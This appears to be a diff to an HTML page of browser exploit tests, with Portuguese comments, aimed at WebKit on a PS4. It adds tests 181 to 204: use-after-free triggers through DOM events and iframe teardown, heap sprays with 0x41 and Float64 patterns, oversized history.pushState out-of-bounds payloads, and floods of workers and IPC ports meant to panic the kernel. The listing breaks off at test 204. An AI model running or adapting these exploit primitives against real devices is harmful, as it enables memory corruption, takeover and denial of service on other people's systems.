@@ -37,6 +37,41 @@
     <button onclick="runTest178()">Teste 178: webkitanimationend + CSSOM deleteRule Panic</button>
     <button onclick="runTest179()">Teste 179: SVG suspendRedraw + adoptNode Detachment</button>
     <button onclick="runTest180()">Teste 180: Media onemptied + outerHTML Teardown</button>
+    <button onclick="runTest181()">Teste 181: Range surroundContents UAF</button>
+    <button onclick="runTest182()">Teste 182: Node normalize() Panic</button>
+    <button onclick="runTest183()">Teste 183: DOMWindow Focus/Blur Cross-Teardown</button>
+    <button onclick="runTest184()">Teste 184: VTTCue onenter Media Teardown</button>
+    <button onclick="runTest185()">Teste 185: Canvas 2D fillText CSSOM Corruption</button>
+    <button onclick="runTest186()">Teste 186: History pushState + DOM Allocation (Heap Smash)</button>
+    <button onclick="runTest187()">Teste 187: SharedWorker + MessageChannel (IPC Descriptor Exhaustion)</button>
+    <button onclick="runTest188()">Teste 188: Pthread Stack Overflow + Atomics Wait (Kernel Freeze)</button>
+    <button onclick="runTest189()">Teste 189: Worker ID Wraparound + Blob URL Flood</button>
+    <button onclick="runTest190()">Teste 190: ArrayBuffer Sort Detach (Thread Race)</button>
+    <button onclick="runTest191()">Teste 191: Exact History OOB Write</button>
+    <button onclick="runTest192()">Teste 192: Fullscreen OPTIONS Interrupt + Float64 Spray</button>
+    <button onclick="runTest193()">Teste 193: Futex Panic (Single Worker Atomics Race)</button>
+    <button onclick="runTest194()">Teste 194: Single IPC MessageChannel Drop</button>
+    <button onclick="runTest195()">Teste 195: adoptNode + NaN-Boxing Float64 Spray</button>
+    <button onclick="runTest196()">Teste 196: IPC Burst (100 Ports Drop + Float64)</button>
+    <button onclick="runTest197()">Teste 197: Pthread Signal Storm (150 Workers Terminate)</button>
+    <button onclick="runTest198()">Teste 198: History OOB Flood & Rapid Traversal</button>
+    <button onclick="runTest199()">Teste 199: Mass Cross-Document Detachment (100 SVGs)</button>
+    <button onclick="runTest200()">Teste 200: Singularity (OPTIONS + IPC + History OOB)</button>
+    <button onclick="runTest201()">Teste 201: OfflineAudioContext Render UAF (Audio Thread)</button>
+    <button onclick="runTest202()">Teste 202: Promise Microtask Queue Ghost Context</button>
+    <button onclick="runTest203()">Teste 203: XHR Blob Abort Race Condition</button>
+    <button onclick="runTest204()">Teste 204: WeakMap Garbage Collection Desync</button>
+    <button onclick="runTest205()">Teste 205: Font-Face Synchronous Decode Panic</button>
+    <button onclick="runTest206()">Teste 206: getGamepads Stolen Reference UAF</button>
+    <button onclick="runTest207()">Teste 207: Live Gamepad Object Leak & Spray</button>
+    <button onclick="runTest208()">Teste 208: Hardware Interrupt (gamepadconnected) Panic</button>
+    <button onclick="runTest209()">Teste 209: Synthetic GamepadEvent Routing Collapse</button>
+    <button onclick="runTest210()">Teste 210: 60FPS Polling Burst + Mathematical Spray</button>
+    <button onclick="runTest211()">Teste 211: WebSocket Handshake Abort UAF</button>
+    <button onclick="runTest212()">Teste 212: CSS RenderGrid Auto-Fill Panic</button>
+    <button onclick="runTest213()">Teste 213: MessagePort Transfer & Teardown Race</button>
+    <button onclick="runTest214()">Teste 214: SVG GPU Filter Detachment</button>
+    <button onclick="runTest215()">Teste 215: CSSOM Vector Reallocation Smash</button>
     
     <hr>
     <h3>Saída / Registo:</h3>
@@ -44,7 +79,7 @@
 
     <div id="test-containers"></div>
 
-    <script>
+<script>
         function logOutput(msg) {
             const out = document.getElementById('output');
             out.innerText = msg + '\n' + out.innerText;
@@ -55,14 +90,14 @@
             document.getElementById('test-containers').innerHTML = '';
         }
 
-        // Função utilitária para tentar reescrever a memória recém-libertada (Heap Spray)
-        function heapSpray() {
+        // O Spray Elegante: Baseado na sua POC, injeta 0x4141414141414141 usando floats
+        function elegantFloatSpray() {
             let spray = [];
-            for (let i = 0; i < 5000; i++) {
-                // Aloca blocos de memória com o padrão 0x41414141 (AAAA)
-                let arr = new Uint32Array(256);
-                arr.fill(0x41414141);
-                spray.push(arr);
+            // Apenas 2000 arrays (baixo consumo de RAM, longe de OOM)
+            for(let i = 0; i < 2000; i++) {
+                const poison = new Float64Array(128); // Bloco pequeno e rápido
+                poison.fill(2.121995791e-314); 
+                spray.push(poison);
             }
             return spray;
         }
@@ -1193,6 +1228,1281 @@
 
             } catch(e) {
                 logOutput("[Teste 180] Motor Multimédia lidou com a reentrância do onemptied em segurança: " + e);
+            }
+        }
+ // ==========================================
+        // Teste 181: Range surroundContents UAF
+        // ==========================================
+        function runTest181() {
+            clearOutput();
+            try {
+                const container = document.getElementById('test-containers');
+                let div = document.createElement('div');
+                let p = document.createElement('p');
+                p.innerText = "Texto Alvo";
+                div.appendChild(p);
+                container.appendChild(div);
+
+                let wrapper = document.createElement('section');
+                let range = document.createRange();
+                range.selectNode(p);
+
+                // O evento síncrono interceta a extração C++ a meio
+                p.addEventListener('DOMNodeRemoved', function handler() {
+                    try {
+                        // Destrói a raiz do range inteiro da memória nativa
+                        div.remove();
+                        range.detach();
+                        
+                        // Pulveriza o Heap para tentar subscrever as variáveis locais do ContainerNode C++
+                        window.sprayRange = heapSpray();
+                        
+                        p.removeEventListener('DOMNodeRemoved', handler);
+                        logOutput("[Teste 181] Extração do Range intercetada. Nó pai aniquilado com sucesso.");
+                    } catch(err) {}
+                });
+
+                // Inicia a rotina perigosa
+                range.surroundContents(wrapper);
+
+            } catch(e) {
+                logOutput("[Teste 181] Motor WebCore protegeu a transação do Range: " + e);
+            }
+        }
+
+        // ==========================================
+        // Teste 182: Node normalize() Panic
+        // ==========================================
+        function runTest182() {
+            clearOutput();
+            try {
+                const container = document.getElementById('test-containers');
+                let bloco = document.createElement('div');
+                
+                // Injeta múltiplos nós de texto adjacentes para forçar iteração C++
+                let t1 = document.createTextNode("Parte 1");
+                let t2 = document.createTextNode("Parte 2");
+                bloco.appendChild(t1);
+                bloco.appendChild(t2);
+                container.appendChild(bloco);
+
+                t1.addEventListener('DOMCharacterDataModified', function handler() {
+                    try {
+                        // A engine C++ está ativamente a concatenar t2 em t1 e disparou a notificação
+                        bloco.remove();
+                        t2.remove(); // Tenta corromper o próximo ponteiro da iteração
+                        
+                        window.sprayNormalize = heapSpray();
+                        
+                        t1.removeEventListener('DOMCharacterDataModified', handler);
+                        logOutput("[Teste 182] Notificação de texto síncrona recebida. Árvore de normalização destruída.");
+                    } catch(err) {}
+                });
+
+                // A função nativa vai fundir os textos e disparar o evento
+                bloco.normalize();
+
+            } catch(e) {
+                logOutput("[Teste 182] A iteração de Node::normalize lidou com a mutação violenta: " + e);
+            }
+        }
+
+        // ==========================================
+        // Teste 183: DOMWindow Focus/Blur Cross-Teardown
+        // ==========================================
+        function runTest183() {
+            clearOutput();
+            try {
+                const container = document.getElementById('test-containers');
+                let iframe = document.createElement('iframe');
+                container.appendChild(iframe);
+
+                // Força o foco na janela principal
+                window.focus();
+
+                window.onblur = function() {
+                    try {
+                        // O C++ está a transferir o estado de foco para o iframe.
+                        // Imediatamente aniquilamos o destinatário do foco!
+                        iframe.remove();
+                        iframe = null;
+                        
+                        window.sprayFocus = heapSpray();
+                        logOutput("[Teste 183] Foco intercetado no onblur síncrono. Iframe de destino assassinado.");
+                        window.onblur = null;
+                    } catch(err) {}
+                };
+
+                // Pede nativamente para focar a janela interna, o que forçará o onblur síncrono
+                iframe.contentWindow.focus();
+
+            } catch(e) {
+                logOutput("[Teste 183] DOMWindow C++ transferiu a máquina de estados em segurança: " + e);
+            }
+        }
+
+        // ==========================================
+        // Teste 184: VTTCue onenter Media Teardown
+        // ==========================================
+        function runTest184() {
+            clearOutput();
+            try {
+                const container = document.getElementById('test-containers');
+                
+                container.innerHTML = '<div><video id="vidAlvo" src="blob:null"></video></div>';
+                let video = document.getElementById('vidAlvo');
+                
+                let track = video.addTextTrack("subtitles", "English", "en");
+                track.mode = "showing";
+
+                // Legenda inserida de 0 a 5 segundos
+                let cue = new VTTCue(0, 5, "Carga");
+                
+                cue.onenter = function() {
+                    try {
+                        // O parser C++ disparou o evento porque o vídeo "entrou" no intervalo da legenda.
+                        // Arrasamos com o contentor de vídeo inteiro.
+                        container.innerHTML = '';
+                        
+                        // Pulveriza a memória na tentativa de intercetar os ponteiros da faixa
+                        window.sprayCue = heapSpray();
+                        logOutput("[Teste 184] onenter C++ genuíno recebido. Motor Multimédia apagado instantaneamente.");
+                    } catch(err) {}
+                };
+
+                track.addCue(cue);
+
+                // Engatilha o motor de media para iniciar a verificação de tempo
+                video.play().catch(()=>{});
+                // Força o relógio interno a disparar o onenter
+                video.currentTime = 1;
+
+            } catch(e) {
+                logOutput("[Teste 184] Gestor de TextTrack isolou o contexto do UAF: " + e);
+            }
+        }
+
+        // ==========================================
+        // Teste 185: Canvas 2D fillText CSSOM Corruption
+        // ==========================================
+        function runTest185() {
+            clearOutput();
+            try {
+                const container = document.getElementById('test-containers');
+                
+                let style = document.createElement('style');
+                document.head.appendChild(style);
+                let sheet = style.sheet;
+                sheet.insertRule("@font-face { font-family: 'VulnFont'; src: local('Arial'); }", 0);
+
+                let canvas = document.createElement('canvas');
+                let ctx = canvas.getContext('2d');
+                container.appendChild(canvas);
+
+                let iframeEspiao = document.createElement('iframe');
+                container.appendChild(iframeEspiao);
+
+                // Injeta código no iframe para escutar o resize síncrono da engine gráfica
+                iframeEspiao.contentWindow.onresize = function() {
+                    try {
+                        // Enquanto o motor está a calcular as métricas visuais...
+                        sheet.deleteRule(0);
+                        window.sprayCanvasFont = heapSpray();
+                    } catch(err) {}
+                };
+
+                // Define a fonte que o C++ tem de pesquisar no CSSOM
+                ctx.font = "50px VulnFont";
+                
+                // Força o resize do iframe para engatilhar o evento paralelo
+                iframeEspiao.style.width = "50px";
+
+                // Desenha o texto, o que bloqueia até a fonte ser resolvida pelo WebCore
+                ctx.fillText("Crash Test", 10, 50);
+
+                logOutput("[Teste 185] Renderização de fonte no Canvas concluída sem falha de segmentação.");
+                setTimeout(() => { if(style.parentNode) style.remove(); }, 100);
+            } catch(e) {
+                logOutput("[Teste 185] Motor de fontes C++ imune à corrupção síncrona do CSSOM: " + e);
+            }
+        }
+// ==========================================
+        // Teste 186: History pushState + DOM Allocation (Heap Smash)
+        // Evolução da sua POC: Funde o overflow do history com alocação DOM massiva para forçar o crash
+        // ==========================================
+        function runTest186() {
+            clearOutput();
+            logOutput("[Teste 186] A iniciar Heap Smash no histórico...");
+            try {
+                const BASE_SIZE = 709522; // Alvo do bucket de 1MB
+                const OOB_SIZE = 340000;
+                
+                const base = "A".repeat(BASE_SIZE);
+                const overflow = "\x01".repeat(OOB_SIZE);
+                const payload = "/" + base + overflow + "AAAA";
+
+                // Injeta na memória C++
+                history.pushState({}, "", payload);
+                logOutput("Payload injetado no bmalloc. A forçar leitura da memória corrompida...");
+
+                // Imediatamente aloca milhares de nós DOM para forçar o alocador a colidir com o overflow
+                let frag = document.createDocumentFragment();
+                for(let i = 0; i < 50000; i++) {
+                    let d = document.createElement('div');
+                    d.className = "A".repeat(100); // Usa memória contígua
+                    frag.appendChild(d);
+                }
+                document.body.appendChild(frag);
+                logOutput("Alocação DOM concluída sem Crash imediato.");
+
+            } catch(e) {
+                logOutput("Erro: " + e);
+            }
+        }
+
+        // ==========================================
+        // Teste 187: SharedWorker + MessageChannel (IPC Descriptor Exhaustion)
+        // Usa a técnica de SharedWorker mas sobrecarrega com portas MessageChannel
+        // ==========================================
+        window.keeps187 = [];
+        function runTest187() {
+            clearOutput();
+            logOutput("[Teste 187] A esgotar descritores IPC no Kernel FreeBSD...");
+            
+            let count = 0;
+            const interval = setInterval(() => {
+                for (let i = 0; i < 10; i++) {
+                    try {
+                        let id = "kpanic_ipc_" + Date.now() + "_" + count;
+                        let sw = new SharedWorker("data:text/javascript,onconnect=e=>{}", id);
+                        
+                        // O golpe: Cada MessageChannel cria um pipe IPC no Kernel
+                        let mc = new MessageChannel();
+                        sw.port.postMessage("open", [mc.port2]);
+                        
+                        window.keeps187.push(sw);
+                        window.keeps187.push(mc.port1); // Mantém a porta viva
+                        count++;
+                    } catch(e) {
+                        clearInterval(interval);
+                        logOutput("Falha de alocação IPC aos: " + count + " workers.");
+                        return;
+                    }
+                }
+                if (count % 50 === 0) logOutput("Portas IPC ativas: " + count);
+                if (count > 800) clearInterval(interval); // Proteção caso não crashe
+            }, 10);
+        }
+
+        // ==========================================
+        // Teste 188: Pthread Stack Overflow + Atomics Wait (Kernel Freeze)
+        // ==========================================
+        function runTest188() {
+            clearOutput();
+            logOutput("[Teste 188] A forçar Stack Overflow em Pthreads via Atomics...");
+            
+            const workerCode = `
+                onmessage = (e) => {
+                    const sab = e.data;
+                    const view = new Int32Array(sab);
+                    
+                    // Função recursiva para estourar a Red Zone da Thread
+                    function explodeStack(n) {
+                        const v = new Float64Array(256); // Aloca muito no stack
+                        if (n > 0) explodeStack(n - 1);
+                        else Atomics.wait(view, 0, 0); // Congela a thread no Kernel estando o stack corrompido
+                    }
+                    
+                    try { explodeStack(1000); } catch(err) { postMessage("Stack mitigado: " + err); }
+                }
+            `;
+            const blob = new Blob([workerCode], {type: "text/javascript"});
+            const url = URL.createObjectURL(blob);
+            
+            const sab = new SharedArrayBuffer(1024);
+            
+            // Lança várias threads simultâneas para esmagar a CPU
+            for(let i=0; i < 20; i++) {
+                let w = new Worker(url);
+                w.onmessage = (e) => logOutput(e.data);
+                w.postMessage(sab);
+            }
+            logOutput("20 Threads enviadas para o abismo do Stack. A aguardar Kernel Panic...");
+        }
+
+        // ==========================================
+        // Teste 189: Worker ID Wraparound + Blob URL Flood
+        // ==========================================
+        function runTest189() {
+            clearOutput();
+            logOutput("[Teste 189] A inundar o registo de URLs e IDs do Kernel...");
+            
+            let count = 0;
+            const interval = setInterval(() => {
+                for(let i = 0; i < 20; i++) {
+                    // Cria Blobs únicos constantemente para estressar o FileSystem virtual
+                    let blob = new Blob(["// Lixo " + count + "_" + i], {type: "text/javascript"});
+                    let url = URL.createObjectURL(blob);
+                    
+                    // Cria e abandona Workers para forçar Wraparound de IDs
+                    let w = new Worker(url);
+                    w.postMessage("die");
+                }
+                count += 20;
+                if (count % 500 === 0) logOutput("Workers & Blobs gerados: " + count);
+                if (count > 5000) clearInterval(interval);
+            }, 10);
+        }
+
+        // ==========================================
+        // Teste 190: ArrayBuffer Sort Detach (Thread Race)
+        // Evolução da sua PoC de Sort com transferência violenta de ArrayBuffer
+        // ==========================================
+        function runTest190() {
+            clearOutput();
+            logOutput("[Teste 190] A iniciar Sort Detach violento...");
+            
+            try {
+                // Buffer muito grande para garantir que o sort demore nativamente
+                const buffer = new ArrayBuffer(5 * 1024 * 1024); // 5MB
+                const array = new Float64Array(buffer); // Float força matemática pesada
+                
+                for(let i=0; i<array.length; i++) array[i] = Math.random();
+                
+                const w = new Worker(URL.createObjectURL(new Blob(["onmessage=()=>{}"], {type:"text/javascript"})));
+                let detached = false;
+                
+                logOutput("A iniciar ordenação C++...");
+                
+                array.sort((a, b) => {
+                    if (!detached) {
+                        // A meio da ordenação C++, transferimos a memória subjacente para a thread
+                        w.postMessage(buffer, [buffer]);
+                        detached = true;
+                    }
+                    // Retorna matemática para obrigar o C++ a ler os ponteiros agora mortos
+                    return a - b;
+                });
+                
+                logOutput("Sort sobreviveu. A vulnerabilidade de ArrayBuffer foi corrigida nesta versão.");
+                w.terminate();
+            } catch(e) {
+                logOutput("Erro esperado ou Crash evitado: " + e.message);
+            }
+        }
+ // ==========================================
+        // Teste 191: Exact History OOB Write
+        // ==========================================
+        function runTest191() {
+            clearOutput();
+            logOutput("[Teste 191] A forçar desalinhamento do alocador do history...");
+            try {
+                // Baseado nos tamanhos que reportam crash consistente na sua PoC (977 + 14460)
+                let size = 977 + (14460 * 2); 
+                const payload1 = "A".repeat(size);
+                
+                // 1. Aloca string
+                history.pushState({}, "", "#" + payload1);
+                
+                // 2. Imediatamente faz replace reduzindo o tamanho abruptamente.
+                // Isto força o WebKit a encurtar o buffer de string em memória.
+                const payload2 = payload1.slice(0, 977);
+                history.replaceState({}, "", "#" + payload2);
+                
+                // 3. Empurra mais um estado para forçar o alocador a reutilizar o "buraco" anterior
+                history.pushState({}, "", "#B");
+                
+                logOutput("Manipulação exata concluída. Se o bmalloc não crashou, a mitigação está ativa.");
+            } catch(e) {
+                logOutput("Erro de history: " + e);
+            }
+        }
+
+        // ==========================================
+        // Teste 192: Fullscreen OPTIONS Interrupt + Float64 Spray
+        // ==========================================
+        let mediaTarget = null;
+        function runTest192() {
+            clearOutput();
+            const container = document.getElementById('test-containers');
+            mediaTarget = document.createElement('video');
+            mediaTarget.src = "blob:null"; // Dummy src
+            container.appendChild(mediaTarget);
+            
+            logOutput("[Teste 192] A solicitar ecrã inteiro. PRESSIONE OPTIONS AGORA!");
+
+            // Solicita ecrã inteiro para forçar o contexto do sistema operativo
+            if (mediaTarget.webkitRequestFullscreen) mediaTarget.webkitRequestFullscreen();
+
+            window.onblur = function() {
+                try {
+                    // O menu OPTIONS suspendeu o renderizador.
+                    // Libertamos o alvo nativo.
+                    mediaTarget.remove();
+                    mediaTarget = null;
+                    
+                    // Preenchemos o buraco com 0x4141414141414141
+                    window.poisonedMemory = elegantFloatSpray();
+                    
+                    // Tentamos referenciar algo para forçar a avaliação C++ no retorno (Refresh)
+                    document.title = "Poisoned";
+                    
+                    logOutput("[Teste 192] UAF e Float64 Spray executados no onblur!");
+                    window.onblur = null;
+                } catch(e) {}
+            };
+        }
+
+        // ==========================================
+        // Teste 193: Futex Panic (Single Worker Atomics Race)
+        // ==========================================
+        function runTest193() {
+            clearOutput();
+            logOutput("[Teste 193] A engatilhar bloqueio Futex no Kernel (Thread única)...");
+            
+            try {
+                const workerCode = `
+                    onmessage = (e) => {
+                        const view = new Int32Array(e.data);
+                        // A thread pede ao Kernel para a bloquear indefinidamente
+                        Atomics.wait(view, 0, 0); 
+                    }
+                `;
+                const url = URL.createObjectURL(new Blob([workerCode], {type: "text/javascript"}));
+                const sab = new SharedArrayBuffer(1024);
+                
+                const w = new Worker(url);
+                w.postMessage(sab);
+                
+                // Exatamente 15 milissegundos depois (tempo para o Kernel estabilizar o bloqueio futex),
+                // enviamos o sinal SIGKILL (terminate).
+                setTimeout(() => {
+                    w.terminate();
+                    logOutput("Sinal terminate enviado para a Thread bloqueada. A aguardar estabilidade do Kernel.");
+                }, 15);
+                
+            } catch(e) {
+                logOutput("Atomics bloqueado ou indisponível: " + e);
+            }
+        }
+
+        // ==========================================
+        // Teste 194: Single IPC MessageChannel Drop
+        // ==========================================
+        function runTest194() {
+            clearOutput();
+            logOutput("[Teste 194] A testar Use-After-Free no descritor IPC...");
+            
+            try {
+                let channel = new MessageChannel();
+                let worker = new SharedWorker("data:text/javascript,onconnect=e=>e.ports[0].onmessage=m=>{}", "ipc_test");
+                
+                // Cria um buffer moderado
+                let payload = new ArrayBuffer(1024 * 512); 
+                
+                // Inicia o envio da porta e do buffer por IPC
+                worker.port.postMessage({ buf: payload, port: channel.port2 }, [payload, channel.port2]);
+                
+                // No instante seguinte (na mesma tick de execução, antes do flush IPC),
+                // aniquilamos a porta de origem.
+                channel.port1.close();
+                worker.port.close();
+                
+                // Spray Float64 na esperança de corromper a estrutura IPC da porta
+                window.sprayIPC = elegantFloatSpray();
+                
+                logOutput("Portas fechadas durante o trânsito C++. Teste sem DoS concluído.");
+            } catch(e) {
+                logOutput("Erro IPC: " + e);
+            }
+        }
+
+        // ==========================================
+        // Teste 195: adoptNode + NaN-Boxing Float64 Spray
+        // ==========================================
+        function runTest195() {
+            clearOutput();
+            try {
+                const container = document.getElementById('test-containers');
+                let iframe = document.createElement('iframe');
+                container.appendChild(iframe);
+
+                let docFilho = iframe.contentWindow.document;
+                let alvo = docFilho.createElementNS("http://www.w3.org/2000/svg", "svg");
+                docFilho.body.appendChild(alvo);
+
+                // Muda o dono do nó nas entranhas do C++
+                let adotado = document.adoptNode(alvo);
+
+                // Destrói o iframe de origem
+                iframe.remove();
+                
+                // Spray com o padrão Float64 (0x41414141...)
+                window.spraySVG = elegantFloatSpray();
+                
+                // Tenta forçar o C++ a calcular as propriedades gráficas do nó adotado e agora "morto"
+                let testMath = adotado.createSVGMatrix();
+                
+                logOutput("[Teste 195] adoptNode SVG processado com Float64 Spray a sobrepor a memória livre.");
+            } catch(e) {
+                logOutput("[Teste 195] Motor WebCore lidou bem com o ownership: " + e);
+            }
+        }
+// ==========================================
+        // Teste 196: IPC Burst (100 Ports Drop + Float64)
+        // ==========================================
+        function runTest196() {
+            clearOutput();
+            logOutput("[Teste 196] A iniciar Tempestade IPC de 100 portas...");
+            
+            try {
+                let worker = new SharedWorker("data:text/javascript,onconnect=e=>{}", "ipc_storm");
+                let canais = [];
+                let payload = new ArrayBuffer(1024 * 64); // 64KB por porta
+                
+                // Abre 100 portas concorrentes (Aumenta a pressão no C++ sem chegar ao DoS)
+                for(let i = 0; i < 100; i++) {
+                    let mc = new MessageChannel();
+                    canais.push(mc);
+                    worker.port.postMessage({ buf: payload, port: mc.port2 }, [mc.port2]);
+                }
+                
+                logOutput("100 portas enviadas para a fila nativa. A executar Drop síncrono...");
+                
+                // Aniquila as portas de origem todas no mesmo tick de CPU
+                for(let i = 0; i < 100; i++) {
+                    canais[i].port1.close();
+                }
+                
+                worker.port.close();
+                window.spray196 = elegantFloatSpray(2); // Spray duplo para cobrir a RAM fragmentada
+                
+                logOutput("Portas fechadas. Spray executado.");
+            } catch(e) {
+                logOutput("Erro no IPC Burst: " + e);
+            }
+        }
+
+        // ==========================================
+        // Teste 197: Pthread Signal Storm (150 Workers Terminate)
+        // ==========================================
+        function runTest197() {
+            clearOutput();
+            logOutput("[Teste 197] A alocar 150 Workers (Abaixo do limite de Panic DoS)...");
+            
+            try {
+                const workerCode = `
+                    onmessage = (e) => {
+                        const view = new Int32Array(e.data);
+                        Atomics.wait(view, 0, 0); // Congela no Kernel
+                    }
+                `;
+                const url = URL.createObjectURL(new Blob([workerCode], {type: "text/javascript"}));
+                const sab = new SharedArrayBuffer(1024);
+                
+                let workers = [];
+                // 150 é pesado o suficiente para stressar o escalonador Pthread, mas seguro contra o limite 400+
+                for(let i = 0; i < 150; i++) {
+                    let w = new Worker(url);
+                    workers.push(w);
+                    w.postMessage(sab);
+                }
+                
+                logOutput("Workers bloqueados nativamente. A enviar tempestade de sinais SIGKILL em 50ms...");
+                
+                setTimeout(() => {
+                    // Executa terminate() em massa
+                    for(let i = 0; i < 150; i++) {
+                        workers[i].terminate();
+                    }
+                    window.spray197 = elegantFloatSpray(1);
+                    logOutput("Sinais enviados e memória pulverizada. A aguardar estabilização do FreeBSD...");
+                }, 50);
+                
+            } catch(e) {
+                logOutput("Falha na alocação de threads: " + e);
+            }
+        }
+
+        // ==========================================
+        // Teste 198: History OOB Flood & Rapid Traversal
+        // ==========================================
+        function runTest198() {
+            clearOutput();
+            logOutput("[Teste 198] A saturar o histórico com tamanhos corrompidos...");
+            
+            try {
+                // Tamanhos baseados na PoC comprovada do PS4
+                let size = 977 + 14460;
+                const payload = "A".repeat(size);
+                
+                // Injeta 50 entradas na velocidade máxima que o C++ suportar
+                for(let i = 0; i < 50; i++) {
+                    history.pushState({}, "", "#" + payload + i);
+                }
+                
+                logOutput("50 estados injetados. A iniciar viagem temporal abrupta...");
+                
+                // Força o bmalloc a libertar os blocos de trás para a frente instantaneamente
+                history.go(-25);
+                
+                // Pulveriza a memória na esperança de o C++ ler o histórico anterior num bloco libertado
+                setTimeout(() => { window.spray198 = elegantFloatSpray(2); }, 1);
+                
+                logOutput("Deslocação efetuada. Teste sem ciclo infinito concluído.");
+            } catch(e) {
+                logOutput("O alocador intercetou a manipulação: " + e);
+            }
+        }
+
+        // ==========================================
+        // Teste 199: Mass Cross-Document Detachment (100 SVGs)
+        // ==========================================
+        function runTest199() {
+            clearOutput();
+            logOutput("[Teste 199] A instanciar 100 contextos SVG...");
+            
+            try {
+                const container = document.getElementById('test-containers');
+                let iframe = document.createElement('iframe');
+                container.appendChild(iframe);
+
+                let docFilho = iframe.contentWindow.document;
+                let alvos = [];
+                
+                for(let i = 0; i < 100; i++) {
+                    let svg = docFilho.createElementNS("http://www.w3.org/2000/svg", "svg");
+                    svg.setAttribute("id", "vuln_" + i);
+                    docFilho.body.appendChild(svg);
+                    alvos.push(svg);
+                }
+
+                logOutput("Arrancando 100 nós para a janela pai...");
+                
+                let adotados = [];
+                for(let i = 0; i < 100; i++) {
+                    adotados.push(document.adoptNode(alvos[i]));
+                }
+
+                // Destrói a janela de origem instantaneamente
+                iframe.remove();
+                
+                // Spray massivo para sujar todos os ponteiros "ownerDocument" possíveis
+                window.spray199 = elegantFloatSpray(3);
+                
+                // Invoca cálculos nativos gráficos nos 100 nós orfãos simultaneamente
+                for(let i = 0; i < 100; i++) {
+                    try { adotados[i].createSVGMatrix(); } catch(err){}
+                }
+                
+                logOutput("[Teste 199] Adoção em massa completada sem Crash seguro.");
+            } catch(e) {
+                logOutput("Falha nativa no gestor de DOM: " + e);
+            }
+        }
+
+        // ==========================================
+        // Teste 200: Singularity (OPTIONS + IPC + History OOB)
+        // ==========================================
+        let fullscreenTarget = null;
+        function runTest200() {
+            clearOutput();
+            const container = document.getElementById('test-containers');
+            fullscreenTarget = document.createElement('div');
+            fullscreenTarget.style.background = "#000";
+            container.appendChild(fullscreenTarget);
+            
+            logOutput("[Teste 200] A solicitar ecrã inteiro. PRESSIONE OPTIONS AGORA!");
+
+            if (fullscreenTarget.webkitRequestFullscreen) fullscreenTarget.webkitRequestFullscreen();
+
+            window.onblur = function() {
+                try {
+                    // O Sistema Operativo da PS4 interrompeu o processo
+                    // 1. Destruição do Alvo
+                    fullscreenTarget.remove();
+                    fullscreenTarget = null;
+                    
+                    // 2. OOB History (Pressão no bmalloc)
+                    const payload = "A".repeat(977 + 14460);
+                    history.pushState({}, "", "#" + payload);
+                    
+                    // 3. IPC Drop (Pressão no Kernel)
+                    let mc = new MessageChannel();
+                    mc.port1.close();
+                    
+                    // 4. Mathematical Spray (0x4141414141414141)
+                    window.spray200 = elegantFloatSpray(4); // Spray pesado!
+                    
+                    document.title = "Singularity Triggered";
+                    logOutput("[Teste 200] SINGULARIDADE EXECUTADA! Memória violentada. Aguardando Refresh ou Crash...");
+                    window.onblur = null;
+                } catch(e) {}
+            };
+        }
+// ==========================================
+        // Teste 201: OfflineAudioContext Render UAF
+        // ==========================================
+        function runTest201() {
+            clearOutput();
+            logOutput("[Teste 201] A preparar a Thread de Áudio de alta prioridade...");
+            
+            try {
+                // Cria um contexto de áudio que processa offline (muito rápido, força a CPU)
+                let actx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(2, 44100 * 5, 44100);
+                let osc = actx.createOscillator();
+                osc.connect(actx.destination);
+                osc.start(0);
+
+                // Inicia a renderização nativa em C++
+                actx.startRendering().then(() => {
+                    logOutput("Renderização C++ sobreviveu à destruição do objeto host.");
+                }).catch(e => {
+                    logOutput("Audio Thread mitigou a falha de forma segura: " + e);
+                });
+
+                // No exato momento em que o C++ começa a processar os 5 segundos de áudio, aniquilamos as referências
+                osc.disconnect();
+                osc = null;
+                actx = null;
+                
+                // Pulverizamos a memória livre com o padrão matemático
+                window.spray201 = elegantFloatSpray(2);
+                
+                logOutput("Referências de Áudio apagadas e memória pulverizada. A thread nativa está em stress.");
+            } catch(e) {
+                logOutput("API WebAudio indisponível ou erro na inicialização: " + e);
+            }
+        }
+
+        // ==========================================
+        // Teste 202: Promise Microtask Queue Ghost Context
+        // ==========================================
+        function runTest202() {
+            clearOutput();
+            logOutput("[Teste 202] A injetar Promises na Fila de Microtarefas C++...");
+            
+            try {
+                const container = document.getElementById('test-containers');
+                let iframe = document.createElement('iframe');
+                container.appendChild(iframe);
+
+                let doc = iframe.contentWindow.document;
+                
+                // Criamos uma cadeia de microtarefas no contexto do iframe
+                let promise = iframe.contentWindow.Promise.resolve();
+                
+                promise.then(() => {
+                    // Microtarefa 1: Destrói o iframe hospedeiro nativamente
+                    iframe.remove();
+                    iframe = null;
+                    window.spray202 = elegantFloatSpray(2);
+                    logOutput("Microtarefa 1 executada. Contexto aniquilado e Heap pulverizado.");
+                }).then(() => {
+                    // Microtarefa 2: O motor C++ tem de processar isto num contexto que já não existe
+                    let lixoFantasma = doc.createElement('div'); // Tenta aceder ao documento morto
+                    logOutput("ATENÇÃO: A Fila de Microtarefas ignorou a destruição do contexto!");
+                }).catch(e => {
+                    logOutput("O C++ abortou as microtarefas remanescentes: " + e);
+                });
+
+            } catch(e) {
+                logOutput("Erro na manipulação de Promessas: " + e);
+            }
+        }
+
+        // ==========================================
+        // Teste 203: XHR Blob Abort Race Condition
+        // ==========================================
+        function runTest203() {
+            clearOutput();
+            logOutput("[Teste 203] A iniciar corrida de I/O na Thread de Rede (XHR)...");
+            
+            try {
+                // Cria um Blob gigante para forçar tempo de leitura
+                let payload = new Uint8Array(10 * 1024 * 1024); // 10MB
+                let blob = new Blob([payload], {type: "application/octet-stream"});
+                let url = URL.createObjectURL(blob);
+                
+                let xhr = new XMLHttpRequest();
+                xhr.open("GET", url, true);
+                
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState === 2) { // HEADERS_RECEIVED
+                        try {
+                            // A thread nativa vai começar a escrever o payload no corpo da resposta
+                            // Nós cortamos a conexão abruptamente e revogamos a memória partilhada
+                            xhr.abort();
+                            URL.revokeObjectURL(url);
+                            
+                            // Removemos a referência ao XHR e pulverizamos o espaço
+                            xhr = null;
+                            window.spray203 = elegantFloatSpray(3);
+                            
+                            logOutput("Conexão XHR abortada a meio do trânsito interno. Memória pulverizada.");
+                        } catch(err) {}
+                    }
+                };
+                
+                xhr.send();
+            } catch(e) {
+                logOutput("Falha estrutural na API XHR: " + e);
+            }
+        }
+
+        // ==========================================
+        // Teste 204: WeakMap Garbage Collection Desync
